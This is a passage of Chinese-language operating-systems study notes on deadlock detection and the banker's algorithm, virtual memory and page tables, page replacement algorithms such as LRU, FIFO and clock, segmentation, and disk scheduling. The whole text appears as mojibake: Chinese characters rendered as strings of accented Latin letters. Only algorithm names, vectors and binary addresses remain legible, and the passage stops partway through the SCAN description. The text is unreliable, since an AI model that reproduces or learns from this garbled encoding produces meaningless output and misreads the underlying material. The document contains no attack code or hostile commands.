ä¸Šå›¾ä¸­ï¼Œæœ‰ä¸‰ä¸ªè¿›ç¨‹å››ä¸ªèµ„æºï¼Œæ¯ä¸ªæ•°æ®ä»£è¡¨çš„å«ä¹‰å¦‚ä¸‹ï¼š E å‘é‡ï¼šèµ„æºæ€»é‡ A å‘é‡ï¼šèµ„æºå‰©ä½™é‡ C çŸ©é˜µï¼šæ¯ä¸ªè¿›ç¨‹æ‰€æ‹¥æœ‰çš„èµ„æºæ•°é‡ï¼Œæ¯ä¸€è¡Œéƒ½ä»£è¡¨ä¸€ä¸ªè¿›ç¨‹æ‹¥æœ‰èµ„æºçš„æ•°é‡ R çŸ©é˜µï¼šæ¯ä¸ªè¿›ç¨‹è¯·æ±‚çš„èµ„æºæ•°é‡ è¿›ç¨‹ P1 å’Œ P2 æ‰€è¯·æ±‚çš„èµ„æºéƒ½å¾—ä¸åˆ°æ»¡è¶³ï¼Œåªæœ‰è¿›ç¨‹ P3 å¯ä»¥ï¼Œè®© P3 æ‰§è¡Œï¼Œä¹‹åé‡Šæ”¾ P3 æ‹¥æœ‰çš„èµ„æºï¼Œæ­¤æ—¶ A = (2 2 2 0)ã€‚P2 å¯ä»¥æ‰§è¡Œï¼Œæ‰§è¡Œåé‡Šæ”¾ P2 æ‹¥æœ‰çš„èµ„æºï¼ŒA = (4 2 2 1) ã€‚P1 ä¹Ÿå¯ä»¥æ‰§è¡Œã€‚æ‰€æœ‰è¿›ç¨‹éƒ½å¯ä»¥é¡ºåˆ©æ‰§è¡Œï¼Œæ²¡æœ‰æ­»é”ã€‚ ç®—æ³•æ€»ç»“å¦‚ä¸‹ï¼š æ¯ä¸ªè¿›ç¨‹æœ€å¼€å§‹æ—¶éƒ½ä¸è¢«æ ‡è®°ï¼Œæ‰§è¡Œè¿‡ç¨‹æœ‰å¯èƒ½è¢«æ ‡è®°ã€‚å½“ç®—æ³•ç»“æŸæ—¶ï¼Œä»»ä½•æ²¡æœ‰è¢«æ ‡è®°çš„è¿›ç¨‹éƒ½æ˜¯æ­»é”è¿›ç¨‹ã€‚ å¯»æ‰¾ä¸€ä¸ªæ²¡æœ‰æ ‡è®°çš„è¿›ç¨‹ Piï¼Œå®ƒæ‰€è¯·æ±‚çš„èµ„æºå°äºç­‰äº Aã€‚ å¦‚æœæ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆå°† C çŸ©é˜µçš„ç¬¬ i è¡Œå‘é‡åŠ åˆ° A ä¸­ï¼Œæ ‡è®°è¯¥è¿›ç¨‹ï¼Œå¹¶è½¬å› 1ã€‚ å¦‚æœæ²¡æœ‰è¿™æ ·ä¸€ä¸ªè¿›ç¨‹ï¼Œç®—æ³•ç»ˆæ­¢ã€‚ ï¼ˆä¸‰ï¼‰æ­»é”æ¢å¤ åˆ©ç”¨æŠ¢å æ¢å¤ åˆ©ç”¨å›æ»šæ¢å¤ é€šè¿‡æ€æ­»è¿›ç¨‹æ¢å¤ 3. æ­»é”é¢„é˜²åœ¨ç¨‹åºè¿è¡Œä¹‹å‰é¢„é˜²å‘ç”Ÿæ­»é”ã€‚ ï¼ˆä¸€ï¼‰ç ´åäº’æ–¥æ¡ä»¶ ä¾‹å¦‚å‡è„±æœºæ‰“å°æœºæŠ€æœ¯å…è®¸è‹¥å¹²ä¸ªè¿›ç¨‹åŒæ—¶è¾“å‡ºï¼Œå”¯ä¸€çœŸæ­£è¯·æ±‚ç‰©ç†æ‰“å°æœºçš„è¿›ç¨‹æ˜¯æ‰“å°æœºå®ˆæŠ¤è¿›ç¨‹ã€‚ ï¼ˆäºŒï¼‰ç ´åå æœ‰å’Œç­‰å¾…æ¡ä»¶ ä¸€ç§å®ç°æ–¹å¼æ˜¯è§„å®šæ‰€æœ‰è¿›ç¨‹åœ¨å¼€å§‹æ‰§è¡Œå‰è¯·æ±‚æ‰€éœ€è¦çš„å…¨éƒ¨èµ„æºã€‚ ï¼ˆä¸‰ï¼‰ç ´åä¸å¯æŠ¢å æ¡ä»¶ ï¼ˆå››ï¼‰ç ´åç¯è·¯ç­‰å¾… ç»™èµ„æºç»Ÿä¸€ç¼–å·ï¼Œè¿›ç¨‹åªèƒ½æŒ‰ç¼–å·é¡ºåºæ¥è¯·æ±‚èµ„æºã€‚ 4. æ­»é”é¿å…åœ¨ç¨‹åºè¿è¡Œæ—¶é¿å…å‘ç”Ÿæ­»é”ã€‚ ï¼ˆä¸€ï¼‰å®‰å…¨çŠ¶æ€ å›¾ a çš„ç¬¬äºŒåˆ— Has è¡¨ç¤ºå·²æ‹¥æœ‰çš„èµ„æºæ•°ï¼Œç¬¬ä¸‰åˆ— Max è¡¨ç¤ºæ€»å…±éœ€è¦çš„èµ„æºæ•°ï¼ŒFree è¡¨ç¤ºè¿˜æœ‰å¯ä»¥ä½¿ç”¨çš„èµ„æºæ•°ã€‚ä»å›¾ a å¼€å§‹å‡ºå‘ï¼Œå…ˆè®© B æ‹¥æœ‰æ‰€éœ€çš„æ‰€æœ‰èµ„æºï¼ˆå›¾ bï¼‰ï¼Œè¿è¡Œç»“æŸåé‡Šæ”¾ Bï¼Œæ­¤æ—¶ Free å˜ä¸º 5ï¼ˆå›¾ cï¼‰ï¼›æ¥ç€ä»¥åŒæ ·çš„æ–¹å¼è¿è¡Œ C å’Œ Aï¼Œä½¿å¾—æ‰€æœ‰è¿›ç¨‹éƒ½èƒ½æˆåŠŸè¿è¡Œï¼Œå› æ­¤å¯ä»¥ç§°å›¾ a æ‰€ç¤ºçš„çŠ¶æ€æ—¶å®‰å…¨çš„ã€‚ å®šä¹‰ï¼šå¦‚æœæ²¡æœ‰æ­»é”å‘ç”Ÿï¼Œå¹¶ä¸”å³ä½¿æ‰€æœ‰è¿›ç¨‹çªç„¶è¯·æ±‚å¯¹èµ„æºçš„æœ€å¤§éœ€æ±‚ï¼Œä¹Ÿä»ç„¶å­˜åœ¨æŸç§è°ƒåº¦æ¬¡åºèƒ½å¤Ÿä½¿å¾—æ¯ä¸€ä¸ªè¿›ç¨‹è¿è¡Œå®Œæ¯•ï¼Œåˆ™ç§°è¯¥çŠ¶æ€æ˜¯å®‰å…¨çš„ã€‚ å®‰å…¨çŠ¶æ€çš„æ£€æµ‹ä¸æ­»é”çš„æ£€æµ‹ç±»ä¼¼ï¼Œå› ä¸ºå®‰å…¨çŠ¶æ€å¿…é¡»è¦æ±‚ä¸èƒ½å‘ç”Ÿæ­»é”ã€‚ä¸‹é¢çš„é“¶è¡Œå®¶ç®—æ³•ä¸æ­»é”æ£€æµ‹ç®—æ³•éå¸¸ç±»ä¼¼ï¼Œå¯ä»¥ç»“åˆç€åšå‚è€ƒå¯¹æ¯”ã€‚ ï¼ˆäºŒï¼‰å•ä¸ªèµ„æºçš„é“¶è¡Œå®¶ç®—æ³• ä¸€ä¸ªå°åŸé•‡çš„é“¶è¡Œå®¶ï¼Œä»–å‘ä¸€ç¾¤å®¢æˆ·åˆ†åˆ«æ‰¿è¯ºäº†ä¸€å®šçš„è´·æ¬¾é¢åº¦ï¼Œç®—æ³•è¦åšçš„æ˜¯åˆ¤æ–­å¯¹è¯·æ±‚çš„æ»¡è¶³æ˜¯å¦ä¼šè¿›å…¥ä¸å®‰å…¨çŠ¶æ€ï¼Œå¦‚æœæ˜¯ï¼Œå°±æ‹’ç»è¯·æ±‚ï¼›å¦åˆ™äºˆä»¥åˆ†é…ã€‚ ä¸Šå›¾ c ä¸ºä¸å®‰å…¨çŠ¶æ€ï¼Œå› æ­¤ç®—æ³•ä¼šæ‹’ç»ä¹‹å‰çš„è¯·æ±‚ï¼Œä»è€Œé¿å…è¿›å…¥å›¾ c ä¸­çš„çŠ¶æ€ã€‚ ï¼ˆä¸‰ï¼‰å¤šä¸ªèµ„æºçš„é“¶è¡Œå®¶ç®—æ³• ä¸Šå›¾ä¸­æœ‰äº”ä¸ªè¿›ç¨‹ï¼Œå››ä¸ªèµ„æºã€‚å·¦è¾¹çš„å›¾è¡¨ç¤ºå·²ç»åˆ†é…çš„èµ„æºï¼Œå³è¾¹çš„å›¾è¡¨ç¤ºè¿˜éœ€è¦åˆ†é…çš„èµ„æºã€‚æœ€å³è¾¹çš„ Eã€P ä»¥åŠ A åˆ†åˆ«è¡¨ç¤ºï¼šæ€»èµ„æºã€å·²åˆ†é…èµ„æºä»¥åŠå¯ç”¨èµ„æºï¼Œæ³¨æ„è¿™ä¸‰ä¸ªä¸ºå‘é‡ï¼Œè€Œä¸æ˜¯å…·ä½“æ•°å€¼ï¼Œä¾‹å¦‚ A=(1020)ï¼Œè¡¨ç¤º 4 ä¸ªèµ„æºåˆ†åˆ«è¿˜å‰©ä¸‹ 1/0/2/0ã€‚ æ£€æŸ¥ä¸€ä¸ªçŠ¶æ€æ˜¯å¦å®‰å…¨çš„ç®—æ³•å¦‚ä¸‹ï¼š æŸ¥æ‰¾å³è¾¹çš„çŸ©é˜µæ˜¯å¦å­˜åœ¨ä¸€è¡Œå°äºç­‰äºå‘é‡ Aã€‚å¦‚æœä¸å­˜åœ¨è¿™æ ·çš„è¡Œï¼Œé‚£ä¹ˆç³»ç»Ÿå°†ä¼šå‘ç”Ÿæ­»é”ï¼ŒçŠ¶æ€æ˜¯ä¸å®‰å…¨çš„ã€‚ å‡è‹¥æ‰¾åˆ°è¿™æ ·ä¸€è¡Œï¼Œå°†è¯¥è¿›ç¨‹æ ‡è®°ä¸ºç»ˆæ­¢ï¼Œå¹¶å°†å…¶å·²åˆ†é…èµ„æºåŠ åˆ° A ä¸­ã€‚ é‡å¤ä»¥ä¸Šä¸¤æ­¥ï¼Œç›´åˆ°æ‰€æœ‰è¿›ç¨‹éƒ½æ ‡è®°ä¸ºç»ˆæ­¢ï¼Œåˆ™çŠ¶æ€æ—¶å®‰å…¨çš„ã€‚ å¦‚æœä¸€ä¸ªçŠ¶æ€ä¸æ˜¯å®‰å…¨çš„ï¼Œéœ€è¦æ‹’ç»è¿›å…¥è¿™ä¸ªçŠ¶æ€ã€‚ å››ã€å†…å­˜ç®¡ç†è™šæ‹Ÿå†…å­˜è™šæ‹Ÿå†…å­˜çš„ç›®çš„æ˜¯ä¸ºäº†è®©ç‰©ç†å†…å­˜æ‰©å……æˆæ›´å¤§çš„é€»è¾‘å†…å­˜ï¼Œä»è€Œè®©ç¨‹åºè·å¾—æ›´å¤šçš„å¯ç”¨å†…å­˜ã€‚ ä¸ºäº†æ›´å¥½çš„ç®¡ç†å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿå°†å†…å­˜æŠ½è±¡æˆåœ°å€ç©ºé—´ã€‚æ¯ä¸ªç¨‹åºæ‹¥æœ‰è‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œè¿™ä¸ªåœ°å€ç©ºé—´è¢«åˆ†å‰²æˆå¤šä¸ªå—ï¼Œæ¯ä¸€å—ç§°ä¸ºä¸€é¡µã€‚è¿™äº›é¡µè¢«æ˜ å°„åˆ°ç‰©ç†å†…å­˜ï¼Œä½†ä¸éœ€è¦æ˜ å°„åˆ°è¿ç»­çš„ç‰©ç†å†…å­˜ï¼Œä¹Ÿä¸éœ€è¦æ‰€æœ‰é¡µéƒ½å¿…é¡»åœ¨ç‰©ç†å†…å­˜ä¸­ã€‚å½“ç¨‹åºå¼•ç”¨åˆ°ä¸€éƒ¨åˆ†ä¸åœ¨ç‰©ç†å†…å­˜ä¸­çš„åœ°å€ç©ºé—´æ—¶ï¼Œç”±ç¡¬ä»¶æ‰§è¡Œå¿…è¦çš„æ˜ å°„ï¼Œå°†ç¼ºå¤±çš„éƒ¨åˆ†è£…å…¥ç‰©ç†å†…å­˜å¹¶é‡æ–°æ‰§è¡Œå¤±è´¥çš„æŒ‡ä»¤ã€‚ ä»ä¸Šé¢çš„æè¿°ä¸­å¯ä»¥çœ‹å‡ºï¼Œè™šæ‹Ÿå†…å­˜å…è®¸ç¨‹åºä¸ç”¨å°†åœ°å€ç©ºé—´ä¸­çš„æ¯ä¸€é¡µéƒ½æ˜ å°„åˆ°ç‰©ç†å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªç¨‹åºä¸éœ€è¦å…¨éƒ¨è°ƒå…¥å†…å­˜å°±å¯ä»¥è¿è¡Œï¼Œè¿™ä½¿å¾—æœ‰é™çš„å†…å­˜è¿è¡Œå¤§ç¨‹åºç§°ä¸ºå¯èƒ½ã€‚ä¾‹å¦‚æœ‰ä¸€å°è®¡ç®—æœºå¯ä»¥äº§ç”Ÿ 16 ä½åœ°å€ï¼Œé‚£ä¹ˆä¸€ä¸ªç¨‹åºçš„åœ°å€ç©ºé—´èŒƒå›´æ˜¯ 0~64Kã€‚è¯¥è®¡ç®—æœºåªæœ‰ 32KB çš„ç‰©ç†å†…å­˜ï¼Œè™šæ‹Ÿå†…å­˜æŠ€æœ¯å…è®¸è¯¥è®¡ç®—æœºè¿è¡Œä¸€ä¸ª 64K å¤§å°çš„ç¨‹åºã€‚ åˆ†é¡µç³»ç»Ÿåœ°å€æ˜ å°„ å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰ï¼šç®¡ç†ç€åœ°å€ç©ºé—´å’Œç‰©ç†å†…å­˜çš„è½¬æ¢ã€‚ é¡µè¡¨ï¼ˆPage tableï¼‰ï¼šé¡µï¼ˆåœ°å€ç©ºé—´ï¼‰å’Œé¡µæ¡†ï¼ˆç‰©ç†å†…å­˜ç©ºé—´ï¼‰çš„æ˜ å°„è¡¨ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼Œé¡µè¡¨çš„ç¬¬ 0 ä¸ªè¡¨é¡¹ä¸º 010ï¼Œè¡¨ç¤ºç¬¬ 0 ä¸ªé¡µæ˜ å°„åˆ°ç¬¬ 2 ä¸ªé¡µæ¡†ã€‚é¡µè¡¨é¡¹çš„æœ€åä¸€ä½ç”¨æ¥æ ‡è®°é¡µæ˜¯å¦åœ¨å†…å­˜ä¸­ã€‚ ä¸‹å›¾çš„é¡µè¡¨å­˜æ”¾ç€ 16 ä¸ªé¡µï¼Œè¿™ 16 ä¸ªé¡µéœ€è¦ç”¨ 4 ä¸ªæ¯”ç‰¹ä½æ¥è¿›è¡Œç´¢å¼•å®šä½ã€‚å› æ­¤å¯¹äºè™šæ‹Ÿåœ°å€ï¼ˆ0010 000000000100ï¼‰ï¼Œå‰ 4 ä½æ˜¯ç”¨æ¥å­˜å‚¨é¡µé¢å·ï¼Œè€Œå 12 ä½å­˜å‚¨åœ¨é¡µä¸­çš„åç§»é‡ã€‚ ï¼ˆ0010 000000000100ï¼‰æ ¹æ®å‰ 4 ä½å¾—åˆ°é¡µå·ä¸º 2ï¼Œè¯»å–è¡¨é¡¹å†…å®¹ä¸ºï¼ˆ110 1ï¼‰ï¼Œå®ƒçš„å‰ 3 ä¸ºä¸ºé¡µæ¡†å·ï¼Œæœ€å 1 ä½è¡¨ç¤ºè¯¥é¡µåœ¨å†…å­˜ä¸­ã€‚æœ€åæ˜ å°„å¾—åˆ°ç‰©ç†å†…å­˜åœ°å€ä¸ºï¼ˆ110 000000000100ï¼‰ã€‚ é¡µé¢ç½®æ¢ç®—æ³•åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœè¦è®¿é—®çš„é¡µé¢ä¸åœ¨å†…å­˜ä¸­ï¼Œå°±å‘ç”Ÿç¼ºé¡µä¸­æ–­ä»è€Œå°†è¯¥é¡µè°ƒå…¥å†…å­˜ä¸­ã€‚æ­¤æ—¶å¦‚æœå†…å­˜å·²æ— ç©ºé—²ç©ºé—´ï¼Œç³»ç»Ÿå¿…é¡»ä»å†…å­˜ä¸­è°ƒå‡ºä¸€ä¸ªé¡µé¢åˆ°ç£ç›˜å¯¹æ¢åŒºä¸­æ¥è…¾å‡ºç©ºé—´ã€‚ é¡µé¢ç½®æ¢ç®—æ³•å’Œç¼“å­˜æ·˜æ±°ç­–ç•¥ç±»ä¼¼ï¼Œå¯ä»¥å°†å†…å­˜çœ‹æˆç£ç›˜çš„ç¼“å­˜ã€‚åœ¨ç¼“å­˜ç³»ç»Ÿä¸­ï¼Œç¼“å­˜çš„å¤§å°æœ‰é™ï¼Œå½“æœ‰æ–°çš„ç¼“å­˜åˆ°è¾¾æ—¶ï¼Œéœ€è¦æ·˜æ±°ä¸€éƒ¨åˆ†å·²ç»å­˜åœ¨çš„ç¼“å­˜ï¼Œè¿™æ ·æ‰æœ‰ç©ºé—´å­˜æ”¾æ–°çš„ç¼“å­˜æ•°æ®ã€‚ é¡µé¢ç½®æ¢ç®—æ³•çš„ä¸»è¦ç›®æ ‡æ˜¯ä½¿é¡µé¢ç½®æ¢é¢‘ç‡æœ€ä½ï¼ˆä¹Ÿå¯ä»¥è¯´ç¼ºé¡µç‡æœ€ä½ï¼‰ã€‚ 1. æœ€ä½³ Optimal æ‰€é€‰æ‹©çš„è¢«æ¢å‡ºçš„é¡µé¢å°†æ˜¯æœ€é•¿æ—¶é—´å†…ä¸å†è¢«è®¿é—®ï¼Œé€šå¸¸å¯ä»¥ä¿è¯è·å¾—æœ€ä½çš„ç¼ºé¡µç‡ã€‚ æ˜¯ä¸€ç§ç†è®ºä¸Šçš„ç®—æ³•ï¼Œå› ä¸ºæ— æ³•çŸ¥é“ä¸€ä¸ªé¡µé¢å¤šé•¿æ—¶é—´ä¸å†è¢«è®¿é—®ã€‚ ä¸¾ä¾‹ï¼šä¸€ä¸ªç³»ç»Ÿä¸ºæŸè¿›ç¨‹åˆ†é…äº†ä¸‰ä¸ªç‰©ç†å—ï¼Œå¹¶æœ‰å¦‚ä¸‹é¡µé¢å¼•ç”¨åºåˆ—ï¼š å¼€å§‹è¿è¡Œæ—¶ï¼Œå…ˆå°† 7, 0, 1 ä¸‰ä¸ªé¡µé¢è£…å…¥å†…å­˜ã€‚å½“è¿›ç¨‹è¦è®¿é—®é¡µé¢ 2 æ—¶ï¼Œäº§ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œä¼šå°†é¡µé¢ 7 æ¢å‡ºï¼Œå› ä¸ºé¡µé¢ 7 å†æ¬¡è¢«è®¿é—®çš„æ—¶é—´æœ€é•¿ã€‚ 2. æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ LRU, Least Recently Used è™½ç„¶æ— æ³•çŸ¥é“å°†æ¥è¦ä½¿ç”¨çš„é¡µé¢æƒ…å†µï¼Œä½†æ˜¯å¯ä»¥çŸ¥é“è¿‡å»ä½¿ç”¨é¡µé¢çš„æƒ…å†µã€‚LRU å°†æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„é¡µé¢æ¢å‡ºã€‚ ä¸ºäº†å®ç° LRUï¼Œéœ€è¦åœ¨å†…å­˜ä¸­ç»´æŠ¤ä¸€ä¸ªæ‰€æœ‰é¡µé¢çš„é“¾è¡¨ã€‚å½“ä¸€ä¸ªé¡µé¢è¢«è®¿é—®æ—¶ï¼Œå°†è¿™ä¸ªé¡µé¢ç§»åˆ°é“¾è¡¨è¡¨å¤´ã€‚è¿™æ ·å°±èƒ½ä¿è¯é“¾è¡¨è¡¨å°¾çš„é¡µé¢æ—¶æœ€è¿‘æœ€ä¹…æœªè®¿é—®çš„ã€‚ å› ä¸ºæ¯æ¬¡è®¿é—®éƒ½éœ€è¦æ›´æ–°é“¾è¡¨ï¼Œå› æ­¤è¿™ç§æ–¹å¼å®ç°çš„ LRU ä»£ä»·å¾ˆé«˜ã€‚ 3. æœ€è¿‘æœªä½¿ç”¨ NRU, Not Recently Used æ¯ä¸ªé¡µé¢éƒ½æœ‰ä¸¤ä¸ªçŠ¶æ€ä½ï¼šR ä¸ Mï¼Œå½“é¡µé¢è¢«è®¿é—®æ—¶è®¾ç½®é¡µé¢çš„ R=1ï¼Œå½“é¡µé¢è¢«ä¿®æ”¹æ—¶è®¾ç½® M=1ã€‚å…¶ä¸­ R ä½ä¼šå®šæ—¶è¢«æ¸…é›¶ã€‚å¯ä»¥å°†é¡µé¢åˆ†æˆä»¥ä¸‹å››ç±»ï¼š R=0ï¼ŒM=0 R=0ï¼ŒM=1 R=1ï¼ŒM=0 R=1ï¼ŒM=1 å½“å‘ç”Ÿç¼ºé¡µä¸­æ–­æ—¶ï¼ŒNRU ç®—æ³•éšæœºåœ°ä»ç±»ç¼–å·æœ€å°çš„éç©ºç±»ä¸­æŒ‘é€‰ä¸€ä¸ªé¡µé¢å°†å®ƒæ¢å‡ºã€‚ NRU ä¼˜å…ˆæ¢å‡ºå·²ç»è¢«ä¿®æ”¹çš„è„é¡µé¢ï¼ˆR=0ï¼ŒM=1ï¼‰ï¼Œè€Œä¸æ˜¯è¢«é¢‘ç¹ä½¿ç”¨çš„å¹²å‡€é¡µé¢ï¼ˆR=1ï¼ŒM=0ï¼‰ã€‚ 4. å…ˆè¿›å…ˆå‡º FIFO, First In First Out é€‰æ‹©æ¢å‡ºçš„é¡µé¢æ˜¯æœ€å…ˆè¿›å…¥çš„é¡µé¢ã€‚ è¯¥ç®—æ³•ä¼šå°†é‚£äº›ç»å¸¸è¢«è®¿é—®çš„é¡µé¢ä¹Ÿè¢«æ¢å‡ºï¼Œä»è€Œä½¿ç¼ºé¡µç‡å‡é«˜ã€‚ 5. ç¬¬äºŒæ¬¡æœºä¼šç®—æ³•FIFO ç®—æ³•å¯èƒ½ä¼šæŠŠç»å¸¸ä½¿ç”¨çš„é¡µé¢ç½®æ¢å‡ºå»ï¼Œä¸ºäº†é¿å…è¿™ä¸€é—®é¢˜ï¼Œå¯¹è¯¥ç®—æ³•åšä¸€ä¸ªç®€å•çš„ä¿®æ”¹ï¼š å½“é¡µé¢è¢«è®¿é—® (è¯»æˆ–å†™) æ—¶è®¾ç½®è¯¥é¡µé¢çš„ R ä½ä¸º 1ã€‚éœ€è¦æ›¿æ¢çš„æ—¶å€™ï¼Œæ£€æŸ¥æœ€è€é¡µé¢çš„ R ä½ã€‚å¦‚æœ R ä½æ˜¯ 0ï¼Œé‚£ä¹ˆè¿™ä¸ªé¡µé¢æ—¢è€åˆæ²¡æœ‰è¢«ä½¿ç”¨ï¼Œå¯ä»¥ç«‹åˆ»ç½®æ¢æ‰ï¼›å¦‚æœæ˜¯ 1ï¼Œå°±å°† R ä½æ¸… 0ï¼Œå¹¶æŠŠè¯¥é¡µé¢æ”¾åˆ°é“¾è¡¨çš„å°¾ç«¯ï¼Œä¿®æ”¹å®ƒçš„è£…å…¥æ—¶é—´ä½¿å®ƒå°±åƒåˆšè£…å…¥çš„ä¸€æ ·ï¼Œç„¶åç»§ç»­ä»é“¾è¡¨çš„å¤´éƒ¨å¼€å§‹æœç´¢ã€‚ 6. æ—¶é’Ÿ Clock ç¬¬äºŒæ¬¡æœºä¼šç®—æ³•éœ€è¦åœ¨é“¾è¡¨ä¸­ç§»åŠ¨é¡µé¢ï¼Œé™ä½äº†æ•ˆç‡ã€‚æ—¶é’Ÿç®—æ³•ä½¿ç”¨ç¯å½¢é“¾è¡¨å°†é¡µé¢é“¾æ¥èµ·æ¥ï¼Œå†ä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æœ€è€çš„é¡µé¢ã€‚ åˆ†æ®µè™šæ‹Ÿå†…å­˜é‡‡ç”¨çš„æ˜¯åˆ†é¡µæŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯å°†åœ°å€ç©ºé—´åˆ’åˆ†æˆå›ºå®šå¤§å°çš„é¡µï¼Œæ¯ä¸€é¡µå†ä¸å†…å­˜è¿›è¡Œæ˜ å°„ã€‚ ä¸‹å›¾ä¸ºä¸€ä¸ªç¼–è¯‘å™¨åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å»ºç«‹çš„å¤šä¸ªè¡¨ï¼Œæœ‰ 4 ä¸ªè¡¨æ˜¯åŠ¨æ€å¢é•¿çš„ï¼Œå¦‚æœä½¿ç”¨åˆ†é¡µç³»ç»Ÿçš„ä¸€ç»´åœ°å€ç©ºé—´ï¼ŒåŠ¨æ€å¢é•¿çš„ç‰¹ç‚¹ä¼šå¯¼è‡´è¦†ç›–é—®é¢˜çš„å‡ºç°ã€‚ åˆ†æ®µçš„åšæ³•æ˜¯æŠŠæ¯ä¸ªè¡¨åˆ†æˆæ®µï¼Œä¸€ä¸ªæ®µæ„æˆä¸€ä¸ªç‹¬ç«‹çš„åœ°å€ç©ºé—´ã€‚æ¯ä¸ªæ®µçš„é•¿åº¦å¯ä»¥ä¸åŒï¼Œå¹¶ä¸”å¯ä»¥åŠ¨æ€å¢é•¿ã€‚ æ®µé¡µå¼ç¨‹åºçš„åœ°å€ç©ºé—´åˆ’åˆ†æˆå¤šä¸ªæ‹¥æœ‰ç‹¬ç«‹åœ°å€ç©ºé—´çš„æ®µï¼Œæ¯ä¸ªæ®µä¸Šçš„åœ°å€ç©ºé—´åˆ’åˆ†æˆå¤§å°ç›¸åŒçš„é¡µã€‚è¿™æ ·æ—¢æ‹¥æœ‰åˆ†æ®µç³»ç»Ÿçš„å…±äº«å’Œä¿æŠ¤ï¼Œåˆæ‹¥æœ‰åˆ†é¡µç³»ç»Ÿçš„è™šæ‹Ÿå†…å­˜åŠŸèƒ½ã€‚ åˆ†é¡µä¸åˆ†æ®µçš„æ¯”è¾ƒ å¯¹ç¨‹åºå‘˜çš„é€æ˜æ€§ï¼šåˆ†é¡µé€æ˜ï¼Œä½†æ˜¯åˆ†æ®µéœ€è¦ç¨‹åºå‘˜æ˜¾ç¤ºåˆ’åˆ†æ¯ä¸ªæ®µã€‚ åœ°å€ç©ºé—´çš„ç»´åº¦ï¼šåˆ†é¡µæ˜¯ä¸€ç»´åœ°å€ç©ºé—´ï¼Œåˆ†æ®µæ˜¯äºŒç»´çš„ã€‚ å¤§å°æ˜¯å¦å¯ä»¥æ”¹å˜ï¼šé¡µçš„å¤§å°ä¸å¯å˜ï¼Œæ®µçš„å¤§å°å¯ä»¥åŠ¨æ€æ”¹å˜ã€‚ å‡ºç°çš„åŸå› ï¼šåˆ†é¡µä¸»è¦ç”¨äºå®ç°è™šæ‹Ÿå†…å­˜ï¼Œä»è€Œè·å¾—æ›´å¤§çš„åœ°å€ç©ºé—´ï¼›åˆ†æ®µä¸»è¦æ˜¯ä¸ºäº†ä½¿ç¨‹åºå’Œæ•°æ®å¯ä»¥è¢«åˆ’åˆ†ä¸ºé€»è¾‘ä¸Šç‹¬ç«‹çš„åœ°å€ç©ºé—´å¹¶ä¸”æœ‰åŠ©äºå…±äº«å’Œä¿æŠ¤ã€‚ äº”ã€è®¾å¤‡ç®¡ç†ç£ç›˜è°ƒåº¦ç®—æ³•è¯»å†™ä¸€ä¸ªç£ç›˜å—çš„æ—¶é—´çš„å½±å“å› ç´ æœ‰ï¼š æ—‹è½¬æ—¶é—´ï¼ˆä¸»è½´æ—‹è½¬ç£ç›˜ï¼Œä½¿å¾—ç£å¤´ç§»åŠ¨åˆ°é€‚å½“çš„æ‰‡åŒºä¸Šï¼‰ å¯»é“æ—¶é—´ï¼ˆåˆ¶åŠ¨æ‰‹è‡‚ç§»åŠ¨ï¼Œä½¿å¾—ç£å¤´ç§»åŠ¨åˆ°é€‚å½“çš„ç£é“ä¸Šï¼‰ å®é™…çš„æ•°æ®ä¼ è¾“æ—¶é—´ å…¶ä¸­ï¼Œå¯»é“æ—¶é—´æœ€é•¿ï¼Œå› æ­¤ç£ç›˜è°ƒåº¦çš„ä¸»è¦ç›®æ ‡æ˜¯ä½¿ç£ç›˜çš„å¹³å‡å¯»é“æ—¶é—´æœ€çŸ­ã€‚ 1. å…ˆæ¥å…ˆæœåŠ¡ FCFS, First Come First Served æŒ‰ç…§ç£ç›˜è¯·æ±‚çš„é¡ºåºè¿›è¡Œè°ƒåº¦ã€‚ ä¼˜ç‚¹æ˜¯å…¬å¹³å’Œç®€å•ã€‚ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå› ä¸ºæœªå¯¹å¯»é“åšä»»ä½•ä¼˜åŒ–ï¼Œä½¿å¹³å‡å¯»é“æ—¶é—´å¯èƒ½è¾ƒé•¿ã€‚ 2. æœ€çŸ­å¯»é“æ—¶é—´ä¼˜å…ˆ SSTF, Shortest Seek Time First ä¼˜å…ˆè°ƒåº¦ä¸å½“å‰ç£å¤´æ‰€åœ¨ç£é“è·ç¦»æœ€è¿‘çš„ç£é“ã€‚ è™½ç„¶å¹³å‡å¯»é“æ—¶é—´æ¯”è¾ƒä½ï¼Œä½†æ˜¯ä¸å¤Ÿå…¬å¹³ã€‚å¦‚æœæ–°åˆ°è¾¾çš„ç£é“è¯·æ±‚æ€»æ˜¯æ¯”ä¸€ä¸ªåœ¨ç­‰å¾…çš„ç£é“è¯·æ±‚è¿‘ï¼Œé‚£ä¹ˆåœ¨ç­‰å¾…çš„ç£é“è¯·æ±‚ä¼šä¸€ç›´ç­‰å¾…ä¸‹å»ï¼Œä¹Ÿå°±æ˜¯å‡ºç°é¥¥é¥¿ç°è±¡ã€‚å…·ä½“æ¥è¯´ï¼Œä¸¤è¾¹çš„ç£é“è¯·æ±‚æ›´å®¹æ˜“å‡ºç°é¥¥é¥¿ç°è±¡ã€‚ 3. ç”µæ¢¯ç®—æ³• SCAN ç”µæ¢¯æ€»æ˜¯ä¿æŒä¸€ä¸ªæ–¹å‘è¿è¡Œï¼Œç›´åˆ°è¯¥æ–¹å‘æ²¡æœ‰è¯·æ±‚ä¸ºæ­¢ï¼Œç„¶åæ”¹å˜è¿è¡Œæ–¹å‘ã€‚ 